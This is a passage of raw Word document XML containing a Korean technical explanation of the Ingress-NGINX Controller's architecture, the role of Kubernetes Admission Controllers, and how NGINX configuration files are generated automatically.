          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>종료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등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다양한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기능을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제공하며</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>운영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환경에서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서비스가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많아질수록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관리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효율성과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보안성을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크게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높일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수</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F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C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A801FA4" w14:textId="11EF3723" w:rsidR="00D6335C" w:rsidRPr="00D6335C" w:rsidRDefault="00D6335C" w:rsidP="00D6335C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D6335C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">3.2. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>아키텍처</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73860E55" w14:textId="16E4BC1C" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller는 Kubernetes 클러스터 내에서 Pod 형태로 배포되며, 클러스터 내 Ingress 리소스를 지속적으로 감시(watch)합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>아키텍처의 주요 구성 요소는 다음과 같습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E0C391" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX Ingress Controller 프로세스</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: Ingress 등 관련 리소스를 감시하며, 변경 사항이 감지되면 NGINX 설정 파일을 자동 생성 및 적용합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BB9912" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX 마스터 및 워커 프로세스</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 마스터가 워커 프로세스를 관리하고, 워커들은 실제 클라이언트 트래픽을 처리해 백엔드 서비스로 전달합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EC2A11" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>캐시 및 컨트롤 루프</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: Ingress Controller는 클러스터 내 리소스 상태를 캐시에 저장하고, 컨트롤 루프를 통해 지속적으로 최신 상태를 반영합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2316C8E9" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ConfigMap, Secret 등 연동</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 커스텀 설정이나 TLS 인증서 등은 별도의 리소스와 연동해 동적으로 반영됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB79535" w14:textId="4671D202" w:rsidR="00D6335C" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00D6335C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Ingress-NGINX Controller는 변경 사항이 있을 때마다 NGINX 설정을 재생성하고, 필요시 NGINX 프로세스를 reload하여 최신 상태를 유지합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E40D0F" w14:textId="34B7F7E3" w:rsidR="00D6335C" w:rsidRPr="00D6335C" w:rsidRDefault="00D6335C" w:rsidP="00D6335C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D6335C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">3.3. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>역할</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F3CD10" w14:textId="57C521D0" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller는 Kubernetes API 서버로 들어오는 요청을 인증 및 인가 이후에 가로채어, 정책에 따라 요청을 검증(Validation)하거나 변경(Mutation)하는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C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>플러그인입니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>주요 역할은 다음과 같습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0EA82B" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안성 강화</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 미리 정의된 정책에 따라 리소스 생성/수정 요청을 허용, 거부, 또는 자동 변경하여 클러스터 보안을 강화합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C564CCA" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정책 일관성 보장</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 리소스에 필수 라벨 추가, 리소스 제한, 네트워크 정책 등 다양한 정책을 강제할 수 있습니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CCD30D" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유형</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: Mutating Admission Controller(요청 변경), Validating Admission Controller(요청 검증)로 구분되며, 두 기능을 모두 수행할 수 있습니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC96254" w14:textId="5BEF6258" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="71"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Webhook</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 내장 정책 외에 사용자 정의 정책을 위해 외부 Webhook 서버와 연동할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CE0ABC" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller는 Kubernetes 리소스의 유효성, 보안성, 일관성을 보장하는 데 필수적인 컴포넌트입니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7988DB1E" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00D6335C" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D6335C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">3.4. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">NGINX </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자동</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>생성</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>과정</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E99E27E" w14:textId="1E465344" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller는 Ingress 리소스 등에서 정의된 규칙을 바탕으로 NGINX 설정 파일(nginx.conf)을 자동으로 생성합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>구체적인 과정은 다음과 같습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4092BC5D" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress 리소스 감지</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 컨트롤러가 Kubernetes API를 통해 새로운 Ingress 리소스나 변경 사항을 감지합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5851054A" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모델 생성</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 감지된 리소스 정보를 바탕으로 내부 모델을 생성합니다.</w:t>
      </w:r>
    </w:p>
